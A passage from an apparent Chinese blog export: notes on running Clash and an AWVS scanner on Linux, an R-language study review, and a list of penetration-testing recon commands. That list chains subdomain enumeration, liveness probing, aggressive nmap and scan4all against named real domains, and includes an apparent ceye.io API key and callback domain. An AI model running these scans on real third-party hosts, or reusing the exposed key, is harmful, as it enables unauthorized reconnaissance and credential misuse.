<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>靶场实战</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】clash在linux服务器上使用</title>
    <url>/posts/192.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="clash-for-linux"><a href="#clash-for-linux" class="headerlink" title="clash for linux"></a>clash for linux</h1><p>clash 启动后会在 <code>~/.config/clash</code> 目录生成配置文件。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;Dreamacro&#x2F;clash&#x2F;releases&#x2F;download&#x2F;v1.11.4&#x2F;clash-linux-amd64-v1.11.4. </span><br><span class="line"></span><br><span class="line">mv clash-linux-amd64  clash</span><br><span class="line"></span><br><span class="line">chmod u+x clash</span><br><span class="line"></span><br><span class="line">.&#x2F;clash</span><br><span class="line"></span><br><span class="line">ls -al ~&#x2F;.config&#x2F;clash</span><br><span class="line">.rw-r--r--   10 einverne 23 Mar 19:30 config.yaml</span><br><span class="line">.rw-r--r-- 4.0M einverne 23 Mar 19:30 Country.mmdb</span><br></pre></td></tr></table></figure></div>

<h1 id="配置Clash订阅以及面板"><a href="#配置Clash订阅以及面板" class="headerlink" title="配置Clash订阅以及面板"></a>配置Clash订阅以及面板</h1><p>1、把windows的订阅打开文件夹</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/01bc5865c477fcd1493bb774bec4b238.png" alt="image-20220813142131248"></p>
<p>2、讲对应的yml改成config.yaml</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ffe89350fbaaee8aaee5a39d819c1e07.png" alt="image-20220813142220591"></p>
<p>3、将此config.yaml替换到~/.config/clash里面的config.yaml</p>
<p>4、下载面板文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;.config&#x2F;clash</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;haishanh&#x2F;yacd&#x2F;archive&#x2F;gh-pages.zip</span><br><span class="line">unzip gh-pages.zip</span><br><span class="line">mv yacd-gh-pages&#x2F; dashboard&#x2F;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/img_convert/ccfccff622b422556db5b157a4119827.png" alt="image-20220813142341024"></p>
<p>可以直接复制windows版本的clash里面的配置文件 然后修改少量的地方</p>
<p>在配置文件中加上/修改如下</p>
<p>secret就是api的访问秘钥 如果没有的话任何人都可以访问你的clash面板的api 不安全</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">secret:</span> <span class="string">xxxx</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:9090</span>  <span class="comment">#别忘记在服务器厂商开放端口号</span></span><br><span class="line"><span class="attr">external-ui:</span> <span class="string">dashboard</span>  <span class="comment">#打开面板</span></span><br></pre></td></tr></table></figure></div>

<p>修改后记得重启服务</p>
<p>然后就可以访问</p>
<p><a href="http://serverip:9090/ui/" target="_blank" rel="noopener">http://serverip:9090/ui/</a></p>
<p>访问到在线面板了 这里就是相当于自己部署了一个前端页面 跟随着clash启动 填入对应的api就可以查看到机器代理的情况了</p>
<p>那么对于我来说就是我的</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9776bf21cdaf8e5b7592f1cb21f1403b.png" alt="image-20220813142714360"></p>
<h4 id="修改系统代理"><a href="#修改系统代理" class="headerlink" title="修改系统代理"></a>修改系统代理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure></div>

<p>加上如下内容 其中端口号根据你的配置文件中指定的端口灵活修改就行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=127.0.0.1:7890</span><br><span class="line"><span class="built_in">export</span> https_proxy=127.0.0.1:7890</span><br></pre></td></tr></table></figure></div>

<p>最后重载配置文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure></div>

<p>这里我们修改的是整个系统的代理配置 如果有更高优先级的配置例如 用户变量 可能会导致不生效 如果代理没有生效可以检查其他的地方是不是也设置了优先级更高的代理 例如当前bash设置的临时变量优先级就比系统优先级更高</p>
<h1 id="用screen后台运行（不使用服务器情况）"><a href="#用screen后台运行（不使用服务器情况）" class="headerlink" title="用screen后台运行（不使用服务器情况）"></a>用screen后台运行（不使用服务器情况）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">apt install screen</span><br><span class="line">screen -ls 列出</span><br><span class="line">screen -r id</span><br></pre></td></tr></table></figure></div>

<p>1.docker打包<br><a href="https://blog.csdn.net/m0_67402125/article/details/123869967" target="_blank" rel="noopener">https://blog.csdn.net/m0_67402125/article/details/123869967</a></p>
<p>2.装载之前打包的tar文件，首先需要安装好你的docker，并运行。<br>执行命令装载到你的docker中<br>docker load&lt; 你的路径/rabbitmq.tar</p>
<p>测试代理</p>
<p>curl myip.ipip.net –proxy <a href="http://127.0.0.1:7890" target="_blank" rel="noopener">http://127.0.0.1:7890</a></p>
<p>docker run -p 7890:7890 -p 8080:8080 -9090:9090  -itd –name shuize gylq:v1 bash</p>
<p>awvs 部署镜像 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker search awvs</span><br><span class="line">docker pull secfa&#x2F;docker-awvs #拉取镜像</span><br><span class="line">docker run -it -d -p 8443:3443 secfa&#x2F;docker-awvs #将Docker的3443端口映射到VPS的8443端口</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/img_convert/5b6a975c5959b6001a20924d0d7c2b04.png" alt="image-20220814091559091"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">默认账号密码：</span><br><span class="line">username: admin@admin.com</span><br><span class="line">password: Admin123</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】渗透时一些工具命令记录</title>
    <url>/posts/193.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Xray命令"><a href="#Xray命令" class="headerlink" title="Xray命令"></a>Xray命令</h1><p>被动扫描</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:9999 --html-output xray.html</span><br></pre></td></tr></table></figure></div>

<p>验证存活</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">httpx -silent -stats -l open-domain.txtls -fl 0 -mc 200,302,403,404,204,303,400,401 -o newurls.txt</span><br></pre></td></tr></table></figure></div>

<p>回显单个子域名、验证存活</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;subfinder -d testexex.com --silent | .&#x2F;ksubdomain v --silent --only-domain  --stdin | .&#x2F;httpx --silent -stats -fl 0 -o newurls.txt</span><br></pre></td></tr></table></figure></div>

<p><strong>批量指纹扫描</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ehole finger -l url.txt -o result.xlsx</span><br></pre></td></tr></table></figure></div>

<p><strong>回显单个子域名，并去重</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;subfinder -d bibvip.com --silent | sort | uniq | .&#x2F;ksubdomain v --silent --only-domain  --stdin -o 1.log</span><br></pre></td></tr></table></figure></div>

<p>回显多种数据、验证存活</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;subfinder -d bibvip.com --silent | .&#x2F;ksubdomain v --silent --only-domain  --stdin | .&#x2F;httpx -title -td -status-code -title -follow-redirects -ip</span><br></pre></td></tr></table></figure></div>

<p><strong>批量子域名第三方收集、去重</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;subfinder -dL domain.txt --silent | sort | uniq | .&#x2F;ksubdomain v --silent --only-domain  --stdin -o 1.log</span><br></pre></td></tr></table></figure></div>

<p>子域名第三方收集、验证存活</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;subfinder -dL domain.txt --silent | .&#x2F;ksubdomain v --silent --only-domain  --stdin | .&#x2F;httpx --silent -stats -fl 0 -o newurls.txt</span><br></pre></td></tr></table></figure></div>

<p><strong>批量子域名爆破收集</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ksubdomain e -silent --only-domain  --dl domain.txt  | .&#x2F;ksubdomain v --silent --only-domain  --stdin -o 5.log</span><br></pre></td></tr></table></figure></div>

<p>子域名爆破收集、存活验证</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ksubdomain e -silent --only-domain  --dl domain.txt | .&#x2F;httpx --silent -stats -fl 0 -o newurls.txt</span><br></pre></td></tr></table></figure></div>

<p>第二层域名爆破收集</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;subfinder -dL domain.txt --silent | .&#x2F;ksubdomain e --silent --only-domain  --stdin</span><br></pre></td></tr></table></figure></div>

<p><strong>第二层域名爆破收集、去重</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;subfinder -dL domain.txt --silent | sort | uniq | .&#x2F;ksubdomain e --silent --only-domain  --stdin -o 1.log</span><br></pre></td></tr></table></figure></div>

<p>整体去重</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cat 5.log | sort |uniq &gt; 6.log</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -n --unique --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX 11.xml --version-intensity 9 --min-rate 10000 -T4 starfish.testexex.com</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;scan4all -l 11.xml -ceyeapi 2b8e073ef7b6cdd1ef7bfd571bd7ca4b -ceyedomain d1qc7a.ceye.io -csv -o output.csv -v</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】uiautomation</title>
    <url>/posts/191.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1、-a -t3 查找主控件</p>
<p>2、-f -t3 查找光标所处的控件</p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】大数据复习总结</title>
    <url>/posts/190.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="数据和大数据的含义："><a href="#数据和大数据的含义：" class="headerlink" title="数据和大数据的含义："></a>数据和大数据的含义：</h1><blockquote>
<p>数据是由生产资料和资本构成的，大数据是由海量数据和针对海量数据处理的解决方案构成。</p>
</blockquote>
<h1 id="大数据的四大特征"><a href="#大数据的四大特征" class="headerlink" title="大数据的四大特征"></a>大数据的四大特征</h1><ul>
<li>体量大（V）：人类累计生成的数据总量</li>
<li>种类多(V)：数据来源广</li>
<li>速度快：数据生成、存储、分析、处理的速度快</li>
<li>价值高：大数据具有巨大的潜在价值</li>
</ul>
<h1 id="大数据的技术支撑"><a href="#大数据的技术支撑" class="headerlink" title="大数据的技术支撑"></a>大数据的技术支撑</h1><ul>
<li>存储：存储成本下降、</li>
<li>计算：运算速度逐渐变快</li>
<li>智能：机器拥有理解数据能力</li>
</ul>
<h1 id="大数据的来源"><a href="#大数据的来源" class="headerlink" title="大数据的来源"></a>大数据的来源</h1><ul>
<li>新摩尔定律的含义：每18个月全球新增信息量是计算机有史以来全部信息量的总和</li>
</ul>
<h1 id="大数据的处理方法"><a href="#大数据的处理方法" class="headerlink" title="大数据的处理方法"></a>大数据的处理方法</h1><ul>
<li>1、大数据的采集：采用多个数据库来接收终端数据</li>
<li>2、大数据预处理的方法<ul>
<li>清理：达到数据格式化标准、重复的数据清除</li>
<li>集成：多个数据库结合并统一存储</li>
<li>交换：规范化等方式将数据转换用于数据挖掘的形式</li>
<li>归约：寻找数据特征，以减少数据规模</li>
</ul>
</li>
<li>3、统计于分析：主要是利用分布式数据库</li>
<li>4、大数据挖掘：创造数据挖掘模型的一组试探法和计算方法。</li>
</ul>
<h1 id="Source是负责接收数据到Flume-Agent的组件"><a href="#Source是负责接收数据到Flume-Agent的组件" class="headerlink" title="Source是负责接收数据到Flume Agent的组件"></a>Source是负责接收数据到Flume Agent的组件</h1><h1 id="数据挖掘的概念"><a href="#数据挖掘的概念" class="headerlink" title="数据挖掘的概念"></a>数据挖掘的概念</h1><ul>
<li>数据挖掘是整个知识发现流程中的一个具体过程。</li>
</ul>
<h1 id="贝叶斯分类（事件一定要假定独立）"><a href="#贝叶斯分类（事件一定要假定独立）" class="headerlink" title="贝叶斯分类（事件一定要假定独立）"></a>贝叶斯分类（事件一定要假定独立）</h1><p><img src="https://gylq.gitee.io/linkimage/img1/Screenshot_2022-06-20-13-20-39-16_99c04817c0de565.jpg" alt=""></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220620132820446.png" alt="image-20220620132820446"></p>
<h1 id="R语言"><a href="#R语言" class="headerlink" title="R语言"></a>R语言</h1><p>注意输出结果时写行标。并且多看看程序。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#基础符号</span><br><span class="line">#加减乘除就不多BB了</span><br><span class="line">算了还是提一下:+-*&#x2F; </span><br><span class="line">#赋值符号</span><br><span class="line">#注意等于号赋值 一般用在函数传参赋值 常规变量赋值还是用箭头</span><br><span class="line">赋值符号：-&gt; 或&lt;- 或 &#x3D;</span><br><span class="line">#重点！！！</span><br><span class="line">求余:%%</span><br><span class="line">整除:%&#x2F;%</span><br><span class="line">#逻辑运算符与或非返回的是逻辑值，不是二进制的那个按位与或非运算</span><br><span class="line">与或非：&amp; | ！</span><br><span class="line">#1.数值型</span><br><span class="line">3.1415926</span><br><span class="line">#2.字符型(单引号和双引号等价R语言中只有字符串)</span><br><span class="line">&quot;hi (*&#x2F;ω＼*)&quot;</span><br><span class="line">&#39;hello ヾ(๑╹◡╹)ﾉ&quot;&#39;</span><br><span class="line">#3.逻辑型，注意都是大写的！</span><br><span class="line">TRUE</span><br><span class="line">FALSE</span><br><span class="line">#5.特殊值</span><br><span class="line">#缺失值理解为：</span><br><span class="line">#一个人提前预约好了车位先用停车告示牌放在车位上即有一个空数据位将会有一个真实数据来填充，那么先用缺失值放在这个数据位上帮它占着，</span><br><span class="line">#等他的车来了也就是等真实数据来了之后再移除这个告示牌将车停进去也就是用这个真实数据覆盖掉缺失值</span><br><span class="line">缺失值（Not Available缩写为NA）：NA</span><br><span class="line">#判断是否为缺失值</span><br><span class="line">is.na(x)</span><br><span class="line">无穷大（Infinite）：Inf</span><br><span class="line">不确定数或者说是非数值（Not a Number）：NaN</span><br><span class="line">#比如 Inf-Inf 就是一个不确定值 当然Inf&#x2F;Inf、Inf-Inf也是不确定值，但Inf+Inf&#x3D;Inf</span><br><span class="line">#判断是否为非数值</span><br><span class="line">is.nan()</span><br><span class="line">#空值理解为：车位是空的而且没有人预约</span><br><span class="line">空值:NULL</span><br><span class="line">#6.向量</span><br><span class="line">#加减运算</span><br><span class="line">&gt; x&lt;-c(1,2,3,4,5)</span><br><span class="line">&gt; y&lt;-c(1,2)</span><br><span class="line">&gt; x+y</span><br><span class="line">[1] 2 4 4 6 6</span><br><span class="line">&gt; x&lt;-c(1,2,3)</span><br><span class="line">&gt; y&lt;-c(1,2,3)</span><br><span class="line">&gt; x+y</span><br><span class="line">[1] 2 4 6</span><br><span class="line">&gt; x-y</span><br><span class="line">[1] 0 0 0</span><br><span class="line">#花式创建向量</span><br><span class="line">&gt; x&lt;-1:5</span><br><span class="line">&gt; x</span><br><span class="line">[1] 1 2 3 4 5</span><br><span class="line">&gt; x&lt;-5:1</span><br><span class="line">&gt; x</span><br><span class="line">[1] 5 4 3 2 1</span><br><span class="line">#序列函数seq(开始值，结束值，步长)</span><br><span class="line">&gt; seq(1,5)</span><br><span class="line">[1] 1 2 3 4 5</span><br><span class="line">&gt; seq(1,5,2)</span><br><span class="line">[1] 1 3 5</span><br><span class="line">&gt; seq(1,5,0.5)</span><br><span class="line">[1] 1.0 1.5 2.0 2.5 3.0 3.5 4.0 4.5 5.0</span><br><span class="line">#重复函数rep(内容，重复次数)</span><br><span class="line">&gt; rep(1,5)</span><br><span class="line">[1] 1 1 1 1 1</span><br><span class="line">&gt; rep(c(1,2,3),2)</span><br><span class="line">[1] 1 2 3 1 2 3</span><br><span class="line">#索引</span><br><span class="line">&gt; x&lt;-5:1</span><br><span class="line">&gt; x</span><br><span class="line">[1] 5 4 3 2 1</span><br><span class="line">&gt; x[4]</span><br><span class="line">[1] 2</span><br><span class="line">&gt; x[1]</span><br><span class="line">[1] 5</span><br><span class="line">#常用函数</span><br><span class="line">&gt; x&lt;-1:3</span><br><span class="line">&gt; x</span><br><span class="line">[1] 1 2 3</span><br><span class="line">#求和</span><br><span class="line">&gt; sum(x)</span><br><span class="line">[1] 6</span><br><span class="line">#最大值</span><br><span class="line">&gt; max(x)</span><br><span class="line">[1] 3</span><br><span class="line">#最小值</span><br><span class="line">&gt; min(x)</span><br><span class="line">[1] 1</span><br><span class="line">#均值</span><br><span class="line">&gt; mean(x)</span><br><span class="line">[1] 2</span><br><span class="line">#长度</span><br><span class="line">&gt; length(x)</span><br><span class="line">[1] 3</span><br><span class="line">#方差</span><br><span class="line">&gt; var(x)</span><br><span class="line">[1] 1</span><br><span class="line">#标准差，认得这个函数就行</span><br><span class="line">&gt; sd(x)</span><br><span class="line">[1] 1</span><br><span class="line">#中位数</span><br><span class="line">&gt; median(x)</span><br><span class="line">[1] 2</span><br><span class="line">#添加函数append(向量，需要添加的值)</span><br><span class="line">&gt; x&lt;-append(x,1)</span><br><span class="line">&gt; x</span><br><span class="line">[1] 1 2 3 1</span><br><span class="line">#替换函数append(向量，向量中的第几个数，替换成)</span><br><span class="line">&gt; x&lt;-replace(x,1,7)</span><br><span class="line">&gt; x</span><br><span class="line">[1] 7 2 3 1</span><br><span class="line">&gt; x&lt;-replace(x,c(2,3),6)</span><br><span class="line">&gt; x</span><br><span class="line">[1] 7 6 6 1</span><br><span class="line">#比较排序sort(向量，是否开启倒序排序)</span><br><span class="line">&gt; x&lt;-sort(x)</span><br><span class="line">&gt; x</span><br><span class="line">[1] 1 6 6 7</span><br><span class="line">&gt; x&lt;-sort(x,TRUE)</span><br><span class="line">&gt; x</span><br><span class="line">[1] 7 6 6 1</span><br><span class="line">#倒序rev(向量)</span><br><span class="line">&gt; x&lt;-rev(x)</span><br><span class="line">&gt; x</span><br><span class="line">[1] 1 6 6 7</span><br><span class="line">&gt; x&lt;-rev(x)</span><br><span class="line">&gt; x</span><br><span class="line">[1] 7 6 6 1</span><br><span class="line">#根据向量的值算出0%是多少，25%是多少……5个百分比quantile(向量) 认识它就可以了</span><br><span class="line">&gt; quantile(x)</span><br><span class="line">  0%  25%  50%  75% 100% </span><br><span class="line">1.00 4.75 6.00 6.25 7.00 </span><br><span class="line">#7.矩阵 matrix(向量，几行，几列)</span><br><span class="line">&gt; x&lt;-matrix(1:4,2,2)</span><br><span class="line">&gt; x</span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]    1    3</span><br><span class="line">[2,]    2    4</span><br><span class="line">&gt; y&lt;-x*2</span><br><span class="line">&gt; y</span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]    2    6</span><br><span class="line">[2,]    4    8</span><br><span class="line">#负号表示非 </span><br><span class="line">&gt; y[-1,]</span><br><span class="line">[1] 4 8</span><br><span class="line">&gt; y[-1]</span><br><span class="line">[1] 4 6 8</span><br><span class="line">&gt; x+y</span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]    3    9</span><br><span class="line">[2,]    6   12</span><br><span class="line">#第一行第一列的值等于 1*2+3*4&#x3D;14这是矩阵的乘法！注意运算符！%*%</span><br><span class="line">&gt; x%*%y</span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]   14   30</span><br><span class="line">[2,]   20   44</span><br><span class="line">#索引</span><br><span class="line">&gt; x[1,2]</span><br><span class="line">[1] 3</span><br><span class="line">&gt; x[1]</span><br><span class="line">[1] 1</span><br><span class="line">&gt; x[1,]</span><br><span class="line">[1] 1 3</span><br><span class="line">#一些常用会认就行</span><br><span class="line">#对角矩阵diag</span><br><span class="line">#求逆线性方程组solve</span><br><span class="line">#求特征向量eign</span><br><span class="line">#求秩rank</span><br><span class="line">#转置t</span><br><span class="line">#行列式det</span><br><span class="line">#8.数组array(向量，维数向量)</span><br><span class="line">#生成了一个2行2列的数组</span><br><span class="line">&gt; array(c(1,2,3,4),c(2,2))</span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]    1    3</span><br><span class="line">[2,]    2    4</span><br><span class="line">#重复两次</span><br><span class="line">&gt; array(1:4,c(2,2,2))</span><br><span class="line">, , 1</span><br><span class="line"></span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]    1    3</span><br><span class="line">[2,]    2    4</span><br><span class="line"></span><br><span class="line">, , 2</span><br><span class="line"></span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]    1    3</span><br><span class="line">[2,]    2    4</span><br><span class="line">#9.列表list(参数名&#x3D;参数内容，参数名&#x3D;参数内容……)</span><br><span class="line">&gt; x&lt;-list(数字&#x3D;1,字符&#x3D;&quot;ヾ(◍°∇°◍)ﾉﾞ&quot;,向量&#x3D;1:4,矩阵&#x3D;matrix(1:4,2,2))</span><br><span class="line">&gt; x</span><br><span class="line">$数字</span><br><span class="line">[1] 1</span><br><span class="line"></span><br><span class="line">$字符</span><br><span class="line">[1] &quot;ヾ(◍°∇°◍)ﾉﾞ&quot;</span><br><span class="line"></span><br><span class="line">$向量</span><br><span class="line">[1] 1 2 3 4</span><br><span class="line"></span><br><span class="line">$矩阵</span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]    1    3</span><br><span class="line">[2,]    2    4</span><br><span class="line"></span><br><span class="line">#引用</span><br><span class="line">&gt; x$数字</span><br><span class="line">[1] 1</span><br><span class="line">&gt; x$字符</span><br><span class="line">[1] &quot;ヾ(◍°∇°◍)ﾉﾞ&quot;</span><br><span class="line">&gt; x$向量</span><br><span class="line">[1] 1 2 3 4</span><br><span class="line">&gt; x$矩阵</span><br><span class="line">     [,1] [,2]</span><br><span class="line">[1,]    1    3</span><br><span class="line">[2,]    2    4</span><br><span class="line">&gt; x$矩阵[1,]</span><br><span class="line">[1] 1 3</span><br><span class="line">#连续引用</span><br><span class="line">&gt; x$列表&lt;-list(a&#x3D;1,b&#x3D;2)</span><br><span class="line">&gt; x$列表</span><br><span class="line">$a</span><br><span class="line">[1] 1</span><br><span class="line"></span><br><span class="line">$b</span><br><span class="line">[1] 2</span><br><span class="line"></span><br><span class="line">&gt; x$列表$a</span><br><span class="line">[1] 1</span><br><span class="line">#10.数据框data.frame(向量，向量，向量,……)</span><br><span class="line">&gt; 姓名&lt;-c(&quot;JOJO&quot;,&quot;派蒙&quot;,&quot;阿尼亚&quot;,&quot;伍六七&quot;)</span><br><span class="line">&gt; 性别&lt;-c(&quot;男&quot;,&quot;女&quot;,&quot;女&quot;,&quot;男&quot;)</span><br><span class="line">&gt; 成绩&lt;-c(91,88，98,88)</span><br><span class="line">&gt; 学生&lt;-data.frame(姓名,性别,成绩)</span><br><span class="line">&gt; 学生</span><br><span class="line">    姓名 性别 成绩</span><br><span class="line">1   JOJO   男   91</span><br><span class="line">2   派蒙   女   88</span><br><span class="line">3 阿尼亚   女   98</span><br><span class="line">4 伍六七   男   88</span><br><span class="line">#行重命名row.names(向量)&lt;-名字向量</span><br><span class="line">&gt; row.names(学生)&lt;-c(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;)</span><br><span class="line">&gt; 学生</span><br><span class="line">    姓名 性别 成绩</span><br><span class="line">a   JOJO   男   91</span><br><span class="line">b   派蒙   女   88</span><br><span class="line">c 阿尼亚   女   98</span><br><span class="line">d 伍六七   男   88</span><br><span class="line">#索引</span><br><span class="line">&gt; 学生[1]</span><br><span class="line">    姓名</span><br><span class="line">a   JOJO</span><br><span class="line">b   派蒙</span><br><span class="line">c 阿尼亚</span><br><span class="line">d 伍六七</span><br><span class="line">&gt; 学生[1,]</span><br><span class="line">  姓名 性别 成绩</span><br><span class="line">a JOJO   男   91</span><br><span class="line">&gt; 学生[1:2,]</span><br><span class="line">  姓名 性别 成绩</span><br><span class="line">a JOJO   男   91</span><br><span class="line">b 派蒙   女   88</span><br><span class="line"></span><br><span class="line">&gt; 学生[学生$成绩&gt;90,]</span><br><span class="line">    姓名 性别 成绩</span><br><span class="line">a   JOJO   男   91</span><br><span class="line">c 阿尼亚   女   98</span><br><span class="line">&gt; 学生[学生$成绩&gt;90]</span><br><span class="line">    姓名 成绩</span><br><span class="line">a   JOJO   91</span><br><span class="line">b   派蒙   88</span><br><span class="line">c 阿尼亚   98</span><br><span class="line">d 伍六七   88</span><br><span class="line">#11.因子factor(向量，水平，标签) 不用太去理解因子，会代码就行</span><br><span class="line">&gt; factor(1:3, labels&#x3D;c(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;))</span><br><span class="line">[1] A B C</span><br><span class="line">Levels: A B C</span><br><span class="line">&gt; factor(1:3)</span><br><span class="line">[1] 1 2 3</span><br><span class="line">Levels: 1 2 3</span><br><span class="line">&gt; factor(1:3,levels &#x3D; 1:5)</span><br><span 